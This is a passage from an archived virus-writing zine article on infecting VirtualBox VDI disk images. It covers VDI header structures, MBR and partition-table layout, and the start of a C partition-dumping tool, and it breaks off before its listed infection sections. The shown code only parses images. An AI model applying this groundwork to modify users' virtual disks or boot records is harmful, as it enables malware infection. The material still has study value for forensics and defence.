@@ -1,0 +1,698 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> WarGame 'VirtualBox's Virtual Disks Infection' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="WarGame"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, WarGame,VirtualBox's Virtual Disks Infection, partition, image, printf, uint, null, version, argv, block, uuid, char, offdata, http, fread, return, fclose"/>
+<meta name="Description" content="The usage of virtualization technology is increasing more and more nowadays, mainly because of it's safe test environment and ability to run another system without the use of multi-boot. In this article we are going to speak about VirtualBox (http://www.virtualbox.org) virtual disks infection. Let's go!"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"993403cc7188ea98526d4848d392e3c11efed76b-1498757436-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vwg03.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>VirtualBox's Virtual Disks Infection</h1><p><a href="/lib/?lang=en&amp;author=WarGame"> WarGame</a><br/> <em><a href="/vx.php?fid=1581#f1581">Electrical Ordered Freedom #2 (EOF-DR-RRLF)</a></em><br/> <em>August 2008</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vwg03.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=VT#vwg03">Back to index</a>] [<a href="/lib/vwg03.html#disqus_thread">Comments</a>]<br/> 
+<ol>
+<li>Introduction</li>
+<li>Structure of a VDI</li>
+<li>MBR &amp; Partitions Table</li>
+<li>Put all together: VDIDump tool</li>
+<li>Infection</li>
+<li>Old skool: boot record infection</li>
+<li>Greetz &amp; References</li>
+</ol>
+<h2>1) Introduction</h2>
+<p>The usage of virtualization technology is increasing more and more nowadays, mainly because of it's safe test environment and ability to run another system without the use of multi-boot. In this article we are going to speak about VirtualBox (http://www.virtualbox.org) virtual disks infection. Let's go!</p>
+<p>Sorry for my poor english, it's not my main language.</p>
+<h2>2) Structure of a VDI</h2>
+<p>A VDI file is a virtual disk of VirtualBox, it can be a dynamically expanded or a fixed-size. We will talk about fixed-size virtual hard disks, since they can be accessed in a simpler way.</p>
+<p>This is the structure of a VDI:</p>
+<pre>
+   ------------------------------------
+   |           VDIPREHEADER           |
+   ------------------------------------
+   |           VDIHEADER              |
+   ------------------------------------
+   |           DATA                   |
+   ------------------------------------
+</pre>
+<p>We can get a lot of interesting information from VDIPREHEADER and VDIHEADER. This is the definition of VDIPREHEADER from VDICore.h:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp;<span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> VDIPREHEADER<br/>
+&nbsp; &nbsp;<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/** Just text info about image type, for eyes only. */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #993333;">char</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;szFileInfo<span style="color: black;">&#91;</span><span style="color: #0000dd;">64</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/** The image signature (VDI_IMAGE_SIGNATURE). */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;u32Signature<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/** The image version (VDI_IMAGE_VERSION). */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;u32Version<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp;<span style="color: black;">&#125;</span> VDIPREHEADER<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PVDIPREHEADER<span style="color: #339933;">;</span><br/>
+&nbsp;</div>
+<p>The most interesting member for us is u32Version, in fact it tells us, which version of VDIHEADER is used.</p>
+<p>There are three version of VDIHEADER:</p>
+<ul>
+<li>VDIHEADER0</li>
+<li>VDIHEADER1</li>
+<li>VDIHEADER1PLUS</li>
+</ul>
+<p>We will use only VDIHEADER1, because in my test virtual disk images it was the used header, but the things written here can be applied to the other two types too.</p>
+<p>This is the definition of VDIHEADER1 from VDICore.h:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp;<span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> VDIHEADER1<br/>
+&nbsp; &nbsp;<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Size of this structure in bytes. */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cbHeader<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** The image type (VDI_IMAGE_TYPE_*). */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;u32Type<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Image flags (VDI_IMAGE_FLAGS_*). */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;fFlags<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Image comment. (UTF-8) */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;szComment<span style="color: black;">&#91;</span>VDI_IMAGE_COMMENT_SIZE<span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Offset of Blocks array from the begining of image file.<br/>
+&nbsp; &nbsp; &nbsp; * Should be sector-aligned for HDD access optimization. */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;offBlocks<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Offset of image data from the begining of image file.<br/>
+&nbsp; &nbsp; &nbsp; * Should be sector-aligned for HDD access optimization. */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;offData<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Legacy image geometry (previous code stored PCHS there). */</span><br/>
+&nbsp; &nbsp; &nbsp; VDIDISKGEOMETRY LegacyGeometry<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Was BIOS HDD translation mode, now unused. */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;u32Dummy<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Size of disk (in bytes). */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint64_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cbDisk<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Block size. (For instance VDI_IMAGE_BLOCK_SIZE.) Should be a power of 2! */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cbBlock<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Size of additional service information of every data block.<br/>
+&nbsp; &nbsp; &nbsp; * Prepended before block data. May be 0.<br/>
+&nbsp; &nbsp; &nbsp; * Should be a power of 2 and sector-aligned for optimization reasons. */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cbBlockExtra<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Number of blocks. */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cBlocks<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Number of allocated blocks. */</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cBlocksAllocated<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** UUID of image. */</span><br/>
+&nbsp; &nbsp; &nbsp; RTUUID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;uuidCreate<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** UUID of image's last modification. */</span><br/>
+&nbsp; &nbsp; &nbsp; RTUUID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;uuidModify<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Only for secondary images - UUID of previous image. */</span><br/>
+&nbsp; &nbsp; &nbsp; RTUUID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;uuidLinkage<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Only for secondary images - UUID of previous image's last modification. */</span><br/>
+&nbsp; &nbsp; &nbsp; RTUUID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;uuidParentModify<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp;<span style="color: black;">&#125;</span> VDIHEADER1<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PVDIHEADER1<span style="color: #339933;">;</span> <br/>
+&nbsp;</div>
+<p>Looking at the structure's members we can see many interesting fields, but for our scope the most interesting one is OffData, it tells us where the "real" disk part begins. Everything done on the disk part must be relative to OffData, for example, if we want to access the sector 456 of the disk we should do something like:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp;...<br/>
+&nbsp; &nbsp;<span style="color: #202020;">seek_vdi</span><span style="color: black;">&#40;</span>OffData<span style="color: #339933;">+</span><span style="color: #0000dd;">456</span><span style="color: #339933;">*</span><span style="color: #0000dd;">512</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp;access_sector<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <br/>
+&nbsp; &nbsp;...<br/>
+&nbsp;</div>
+<p>We must check the u32Type member too, it tells us if virtual disk is fixed-size or dynamically expanded. Here is shown the use of OffData:</p>
+<pre>
+   ------------------------------------
+   |           VDIPREHEADER           |
+   ------------------------------------
+   |           VDIHEADER              |
+   ------------------------------------
+   |           DATA                   |
+   |           ....                   | 
+   |           OffData -> MBR         |
+   ------------------------------------
+</pre>
+<p>In few words, if we'll seek from the beginning of the VDI files for OffData bytes, we'll get the location of the Master Boot Record (the sector 1 which contains a lot of interesting infos about the logic organization of the disk).</p>
+<h2>3) MBR &amp; Partitions Table</h2>
+<p>We understood how to get the location of the sector 1 (MBR), now will see its structure:</p>
+<pre>
+   ------------------------------------------ 0
+   |                                        |   \
+   |              CODE AREA                 |     The first 446bytes contains
+   |                                        |   / the boot code
+   ------------------------------------------ 446
+   |                                        |  \  The partition table occupies
+   |           PARTITIONS TABLE             |     64 bytes, it is made of four
+   |                                        |  /  entries of 16 bytes
+   ------------------------------------------ 510
+   |                                        |  \  The boot record signature
+   |          BOOT RECORD SIGNATURE         |     occupies the last 2 bytes, it
+   |                                        |  /  must be set to AA55h
+   ------------------------------------------ 512
+</pre>
+<p>The size of MBR or any other sector is 512 bytes (this is the standard sector size for normal x86-based PC). The partitions table is made in this way:</p>
+<pre>
+   -----------------------------------------
+   |          PARTITION ENTRY 1            |  16 bytes
+   -----------------------------------------
+   |	      PARTITION ENTRY 2            |  16 bytes
+   -----------------------------------------
+   |          PARTITION ENTRY 3            |  16 bytes
+   ----------------------------------------- 
+   |          PARTITION ENTRY 4            |  16 bytes   
+   -----------------------------------------
+</pre>
+<p>Each entry occupies 16 bytes, here the their structure:</p>
+<pre>
+   -------------------------------------- 0
+   |                                    |  \ If this field is set to 80h is the
+   |           BOOT INDICATOR           |    partition is active, if it's not,
+   |                                    |  / it's set to 00h 
+   -------------------------------------- 1
+   |                                    |  \ This field tells us the location of
+   |           STARTING CHS VALUE       |    the first sector of the partition
+   |                                    |  / if it's within first 1024 cylinders
+   -------------------------------------- 4
+   |                                    |  \ Partition type (the file system of
+   |           PARTITION TYPE           |    the partition (FAT16, FAT32, NTFS,
+   |                                    |  / EXT2, EXT3, et cetera))
+   -------------------------------------- 5 
+   |                                    |  \ This field tells us location of the
+   |           ENDING CHS VALUE         |    last sector of partition if it's
+   |                                    |  / within first 1024 cylinders
+   -------------------------------------- 8
+   |                                    |  \ This field tells us the first sector
+   |           STARTING SECTOR          |    of partition, counting from the
+   |                                    |  / sector 0 (using 4 bytes)
+   -------------------------------------- 12
+   |                                    |  \ This field tells us the size of
+   |       PARTITION SIZE IN SECTORS    |    partition in sectors (using 4 bytes)
+   |                                    |  /
+   -------------------------------------- 16
+</pre>
+<p>Now we are able to find the MBR and getting from it the infos that we need about the logic layout of our virtual disk. The next step will be to find a way to access such partitions or to use a better term, "mounting" them.</p>
+<h2>4) Put all together: VDIDump tool</h2>
+<p>I tested this tool only on my ubuntu linux system.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* DumpVDI.c */</span><br/>
+<br/>
+<span style="color: #808080; font-style: italic;">/* A tool to dump partitions table inside a virtual disk (vdi file) by WarGame/DoomRiderz */</span><br/>
+<br/>
+<span style="color: #339933;">#include &lt;stdio.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;string.h&gt;</span><br/>
+<br/>
+<span style="color: #808080; font-style: italic;">/* from VDICore.h and VBoxHDD-new.h*/</span><br/>
+<br/>
+<span style="color: #993333;">typedef</span> <span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> <span style="color: #993333;">uint32_t</span><span style="color: #339933;">;</span><br/>
+<span style="color: #993333;">typedef</span> <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> <span style="color: #993333;">long</span> <span style="color: #993333;">uint64_t</span><span style="color: #339933;">;</span><br/>
+<br/>
+<span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> VDIDISKGEOMETRY<br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Cylinders. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp;cCylinders<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Heads. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp;cHeads<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Sectors per track. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp;cSectors<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Sector size. (bytes per sector) */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp;cbSector<span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span> VDIDISKGEOMETRY<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PVDIDISKGEOMETRY<span style="color: #339933;">;</span><br/>
+<br/>
+<span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> VDIPREHEADER <br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Just text info about image type, for eyes only. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">char</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;szFileInfo<span style="color: black;">&#91;</span><span style="color: #0000dd;">64</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** The image signature (VDI_IMAGE_SIGNATURE). */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;u32Signature<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** The image version (VDI_IMAGE_VERSION). */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;u32Version<span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span> VDIPREHEADER<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PVDIPREHEADER<span style="color: #339933;">;</span><br/>
+<br/>
+<span style="color: #339933;">#define VDI_IMAGE_COMMENT_SIZE &nbsp; &nbsp;256</span><br/>
+<br/>
+<span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> VDIHEADER1<br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Size of this structure in bytes. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cbHeader<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** The image type (VDI_IMAGE_TYPE_*). */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;u32Type<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Image flags (VDI_IMAGE_FLAGS_*). */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;fFlags<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Image comment. (UTF-8) */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">char</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;szComment<span style="color: black;">&#91;</span>VDI_IMAGE_COMMENT_SIZE<span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Offset of Blocks array from the begining of image file.<br/>
+&nbsp; &nbsp; &nbsp;* Should be sector-aligned for HDD access optimization. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;offBlocks<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Offset of image data from the begining of image file.<br/>
+&nbsp; &nbsp; &nbsp;* Should be sector-aligned for HDD access optimization. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;offData<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Legacy image geometry (previous code stored PCHS there). */</span><br/>
+&nbsp; &nbsp; VDIDISKGEOMETRY LegacyGeometry<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Was BIOS HDD translation mode, now unused. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;u32Dummy<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Size of disk (in bytes). */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint64_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cbDisk<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Block size. (For instance VDI_IMAGE_BLOCK_SIZE.) Should be a power of 2! */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cbBlock<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Size of additional service information of every data block.<br/>
+&nbsp; &nbsp; &nbsp;* Prepended before block data. May be 0.<br/>
+&nbsp; &nbsp; &nbsp;* Should be a power of 2 and sector-aligned for optimization reasons. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cbBlockExtra<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Number of blocks. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cBlocks<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Number of allocated blocks. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;cBlocksAllocated<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** UUID of image. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">char</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;uuidCreate<span style="color: black;">&#91;</span><span style="color: #0000dd;">16</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** UUID of image's last modification. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">char</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;uuidModify<span style="color: black;">&#91;</span><span style="color: #0000dd;">16</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Only for secondary images - UUID of previous image. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">char</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;uuidLinkage<span style="color: black;">&#91;</span><span style="color: #0000dd;">16</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/** Only for secondary images - UUID of previous image's last modification. */</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">char</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;uuidParentModify<span style="color: black;">&#91;</span><span style="color: #0000dd;">16</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span> VDIHEADER1<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PVDIHEADER1<span style="color: #339933;">;</span><br/>
+<br/>
+<span style="color: #808080; font-style: italic;">/** Get VDI major version from combined version. */</span><br/>
+<span style="color: #339933;">#define VDI_GET_VERSION_MAJOR(uVer) &nbsp; &nbsp;((uVer) &gt;&gt; 16)</span><br/>
+<span style="color: #808080; font-style: italic;">/** Get VDI minor version from combined version. */</span><br/>
+<span style="color: #339933;">#define VDI_GET_VERSION_MINOR(uVer) &nbsp; &nbsp;((uVer) &amp; 0xffff)</span><br/>
+<br/>
+<span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> MBR <span style="color: #808080; font-style: italic;">/* my definition for master boot record */</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> boot_code<span style="color: black;">&#91;</span><span style="color: #0000dd;">446</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> partitions<span style="color: black;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: black;">&#93;</span><span style="color: black;">&#91;</span><span style="color: #0000dd;">16</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">short</span> signature<span style="color: #339933;">;</span> <br/>
+<span style="color: black;">&#125;</span>MBR<span style="color: #339933;">;</span><br/>
+<br/>
+<span style="color: #808080; font-style: italic;">/****************/</span><br/>
+<br/>
+<br/>
+<span style="color: #993333;">void</span> ExtractPartition<span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>f<span style="color: #339933;">,</span><span style="color: #993333;">int</span> offdata<span style="color: #339933;">,</span><span style="color: #993333;">int</span> part_num<span style="color: #339933;">,</span><span style="color: #993333;">int</span> start_sect<span style="color: #339933;">,</span><span style="color: #993333;">int</span> size_sect<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FILE <span style="color: #339933;">*</span>vdi <span style="color: #339933;">=</span> NULL<span style="color: #339933;">,*</span>part <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span>&nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> ex_name<span style="color: black;">&#91;</span><span style="color: #0000dd;">128</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>buf<span style="color: black;">&#91;</span><span style="color: #0000dd;">512</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> size <span style="color: #339933;">=</span> size_sect<span style="color: #339933;">*</span><span style="color: #0000dd;">512</span><span style="color: #339933;">;</span><br/>
+<br/>
